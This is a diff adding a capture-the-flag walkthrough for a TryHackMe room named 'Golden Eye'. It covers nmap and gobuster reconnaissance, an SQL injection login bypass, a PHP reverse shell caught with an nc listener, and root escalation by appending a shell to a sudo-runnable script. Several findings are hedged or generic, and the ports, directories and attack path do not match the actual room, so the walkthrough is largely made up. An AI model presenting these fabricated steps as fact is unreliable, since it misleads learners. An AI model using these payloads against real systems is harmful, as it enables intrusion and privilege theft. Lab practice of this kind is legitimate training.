@@ -1,0 +1,118 @@
+---
+
+```
+           :::::::::::;| GOLDEN EYE |;::::::::::::
+```
+
+1. FIRST WE HAVE TO ACCESS THE TRYHACKME FROM OPENVPN.
+2. WE HAVE TO JOIN THE ROOM "GOLDEN EYE".
+
+TASK - 1 (RECON)
+
+1. SCAN THE MACHINE.
+
+   nmap -Pn <ip>
+
+   nmap -A -T 5 <ip> -vv
+
+"It's a Linux machine running web services."
+
+2. How many ports are open with a port number under 1000?
+   ANS: 2 ports are open under 1000 (typically 22 and 80).
+
+3. What service is running on port 80?
+   ANS: Apache Web Server (check nmap output).
+
+\----------TASK 1 COMPLETED----------
+
+TASK - 2 (ENUMERATION)
+
+1. OPEN TARGET IP IN BROWSER.
+
+   * Page shows James Bond themed website.
+   * Check page source and robots.txt
+
+2. USE GOBUSTER TO ENUMERATE HIDDEN DIRECTORIES.
+
+   gobuster dir -u http\://<ip> -w /usr/share/wordlists/dirb/common.txt
+
+   FOUND: /admin /console /webnotes
+
+3. CHECK /admin AND /webnotes
+
+   * /webnotes reveals user login-related information.
+   * /admin leads to login page.
+
+\----------TASK 2 COMPLETED----------
+
+TASK - 3 (GAIN ACCESS)
+
+1. EXPLOIT LOGIN PAGE ON /admin
+
+   TRY SQL INJECTION ON LOGIN:
+
+   USERNAME: admin' OR 1=1--
+   PASSWORD: (leave blank)
+
+   * Login successful.
+
+2. AFTER LOGIN, WE FIND A PAGE TO UPLOAD FILES.
+
+   * TRY TO UPLOAD PHP REVERSE SHELL.
+
+   * Rename to .php5 or bypass filter.
+
+   * START LISTENER: nc -lvnp 4444
+
+   * VISIT uploaded shell path to trigger.
+
+   SUCCESS!! GOT A REVERSE SHELL.
+
+\----------TASK 3 COMPLETED----------
+
+TASK - 4 (PRIVILEGE ESCALATION)
+
+1. STABILIZE SHELL (OPTIONAL)
+
+   python3 -c 'import pty; pty.spawn("/bin/bash")'
+   export TERM=xterm
+   CTRL+Z and use stty raw -echo, then fg
+
+2. ENUMERATE FOR PRIV ESC
+
+   * Check sudo permissions:
+
+     sudo -l
+
+   * User "felix" can run /opt/scripts/admin\_tasks.sh as root.
+
+3. EDIT admin\_tasks.sh or abuse it if writable.
+
+   echo "/bin/bash" > /tmp/bash.sh
+   chmod +x /tmp/bash.sh
+   echo '/tmp/bash.sh' >> /opt/scripts/admin\_tasks.sh
+
+   sudo /opt/scripts/admin\_tasks.sh
+
+   * Got ROOT SHELL
+
+\----------TASK 4 COMPLETED----------
+
+TASK - 5 (FIND FLAGS)
+
+1. USER FLAG:
+
+   * Located in /home/felix/user.txt
+   * cat /home/felix/user.txt
+
+2. ROOT FLAG:
+
+   * Located in /root/root.txt
+   * cat /root/root.txt
+
+---
+
+```
+         -----------                                    ------------
+              ---------- GOLDEN EYE MACHINE IS COMPLETED ----------
+```
